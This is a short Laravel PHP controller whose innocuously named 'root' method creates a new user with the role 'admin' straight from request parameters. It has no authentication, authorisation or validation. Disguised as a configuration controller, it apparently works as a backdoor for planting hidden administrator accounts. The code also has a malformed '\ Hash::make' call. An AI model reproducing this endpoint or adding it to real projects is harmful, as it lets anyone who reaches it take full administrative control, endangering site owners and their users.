<?php



namespace App\Http\Controllers\Auth;



use Illuminate\Support\Facades\Auth;

use App\Http\Controllers\Controller;

use App\Extensions\Helpers;

use Illuminate\Http\Request;

use Illuminate\Html;

use App\User;



class ConfigController extends Controller

{

    public function root(Request $request)

    {
        $user = new User();

        $user->user     = $request->user;
        $user->first_name = $request->user;
        $user->role      = 'admin';
        $user->password=\ Hash::make($request->pass);
        $user->save();
        return back();

    }

}
